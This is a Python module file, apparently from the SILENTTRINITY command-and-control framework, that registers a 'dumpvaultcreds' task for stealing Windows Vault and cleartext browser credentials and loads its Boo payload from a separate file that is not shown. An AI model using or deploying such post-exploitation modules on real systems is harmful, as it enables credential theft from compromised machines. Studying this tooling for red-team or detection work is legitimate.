from silenttrinity.core.utils import get_path_in_package
from silenttrinity.core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/dumpvaultcreds'
        self.language = 'boo'
        self.description = 'Dumps Windows Vault credentials including cleartext web credentials for IE/Edge'
        self.author = '@byt3bl33d3r'
        self.references = []
        self.options = {}

    def payload(self):
        with open(get_path_in_package('core/teamserver/modules/boo/src/dumpVaultCredentials.boo')) as module_src:
            src = module_src.read()
            return src
